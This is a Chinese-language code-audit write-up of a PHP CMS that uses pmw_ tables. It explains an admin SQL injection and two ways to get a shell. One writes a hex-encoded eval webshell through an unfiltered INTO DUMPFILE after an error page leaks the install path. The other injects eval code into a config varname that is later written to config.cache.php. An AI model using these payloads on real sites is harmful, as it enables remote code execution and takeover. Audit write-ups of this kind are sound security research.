然后我们会发现这里实际上是调用了IsCategoryPriv函数传参所没有初始化并且拼接进的SQL语句没用使用引号包含造成的SQL注入。使用了这个函数，然后传参没用初始化的文件也有好多。
## 正餐：
后台SQL注入似乎危害不够，进了后台不应该是想着Getshell吗？
那我们来看看我找到的Getshell方法。
### Getshell 一(通过into_dumpfile):
admin/database_backup.php这个文件的第43行出现的一个switch,于是乎action传参决定执行哪个功能。
第238行-269行
这里只拦截了删除语句，以及去除反斜杠还有去空格，没有拦截其他的语句，那么我们再去Execute这个函数看看，这个函数在include/mysqli.class.php的166行被定义
这里有一个安全性检测我们去看下，这个函数还是在这个文件被定义，在523行到结束，这里代码有点长，我就贴核心的一块吧。
他过滤了一些常用的黑客函数，比如Union,sleep,benchmark,load_file,into
outfile,但是他过滤还是有疏忽，他想到了过滤into outfile,但是没有过滤into dumpfile，所以只要我们使用into
dumpfile就可以直接getshell写入一个webshell，但是写文件有个很大的问题就是需要知道他的绝对路径，那么绝对路径我们该怎么办妮？
我们可以看到4g.php这个文件,4g.php的第41行只要我们传参m=show
就会调用templates/default/mobile/show.php
我们来看看这个文件的第24-49行。
很明显这里24行是通过SELECT * FROM `#@__infoclass` WHERE id = $cid AND checkinfo =
‘true’ ORDER BY orderid ASC去获取$row,我们传参cid他就会去读取
pmw_infoclasee表里面的内容，然后当cid=4的时候，因为49行要输出$row[‘title’]但是获取的参数中没有这个数据，于是乎就抛出了报错。
那么我们就获取了绝对路径，我这个的绝对路径是C:\phpstudy\WWW\
所以我们只要访问http://192.168.32.141//4g.php?m=show&&cid=4，就可以获得绝对路径，然后后台导出吧，为了防止过滤问题，我把导出的一句话写成了16进制。
一句话：
16进制后：3c3f70687020406576616c28245f524551554553545b615d293b3f3e
于是乎导出语句就是：
select 0x3c3f70687020406576616c28245f524551554553545b615d293b3f3e into
dumpfile ‘C:/phpstudy/WWW/shell.php’
直接访问后台页面，然后选择数据库的执行SQL语句就行
点击执行就行了。成功执行
然后成功导出一句话木马，拿到了webshell
### Getshell 二（通过修改数据库内容）：
查看后台的site_save.php文件。我们看13行-56行这个分支代码，第56行有一个函数我们来看看是什么作用。
这个函数在这个文件的第131行-163行定义。
实际上就是读取数据库里面的#@__webconfig`表的数据，然后进行遍历，然后拼接进$str这个遍历，然后执行Writef这个函数，我先解释以下#@__webconfig`是什么表，实际上#@__
是代替前缀的，当处理的时候就会按照我安装的时候设定的前缀进行替换，我使用的是默认设置pmw作为表前缀，那么这里读取pmw_webconfig的内容，然后里面有两个if语句，其实看这个$str的阵势都能看出来这里是要写入配置到config.cache.php。
我们先来看这个函数里面的两个if,第一个if他的作用就是判断数据表里面的字段varname如果读出来是cfg_countcode的时候将那条数据的varvalue所对应的值删除反斜杠然后赋值给$row[‘varvalue’]
第二个if就是判断表的vartype字段查出来是不是number,如果不是的话执行
    $str .= "\${$row['varname']} = '".str_replace("'",'',$row['varvalue'])."';\r\n”
$row[‘varname’] 这个值是我们表里面查到的字段varname的值
$row[‘varvalue’] 这个值是我们表里面查到的字段varvalue的值
然后str_repalce是替换单引号，怕我使用单引号来跳出这个赋值，然后进行Getshell
那么如果$row[‘varname’]=a
    $row['varvalue']=b
这个变量str就变为了
这里很明显有防范我单引号跳出来造成getshell，我们我们想一下，如果我们能够控制$row[‘varname’]这个值是不是就可以代码执行了，比如这个值为
    $row['varname']=a;eval($_REQUEST[a]);//
那么执行就变为了
    $a;eval($_REQUEST[a]);//= 'b';
很明显有一句话木马，然后注释了后面，语法也没用问题。那么核心就是两个，第一个是控制这个$row[‘varname’]，控制这个字段很明显就是修改数据库里面的内容呗。后台功能里面就提供了一个更新数据库的功能，我只需要执行
    update pmw_webconfig set varname = 'a;eval($_REQUEST[a])//' where orderid=97
成功执行，然后我们看看数据库里面
当然我这样看是偷懒了，用后台自带的数据库执行也是可以查看的。
那么我们通过这个方法已经修改掉了varname,那么如果$str真的是写入文件的话我们的
webshell就到手了。
那我们再看看Writef函数是干什么的，这个函数在common.func.php的第364-389行被定义。
很明显，判断如果函数传参$file的目录存在可写就写入，写入的东西就是函数传参的$str。
那么函数传参的$str不就是前面我们拼凑出来的变量str。
所以这里就是写入文件到config.cache.php文件。
万事俱备了，我们改了数据库内容能让恶意语句拼接进去了。那么我们只要触发就行。具体操作也很简单，我们在站点配置管理随便加一个新站点。
随便写就行，然后提交，我们的一句话就被插进去了。
然后我们只要传参a就行
成功Getshell
## 0×03 总结
其实该CMS所存在的漏洞不仅仅只有这些，我文章中的这些也只是一个抛砖引玉，只是为了阐述通读全文的审计方法，如果我文章中有什么写的可以再改进的地方，可以随时联系我！谢谢大家花费了时间来读在下的粗鄙小文，谢谢大家。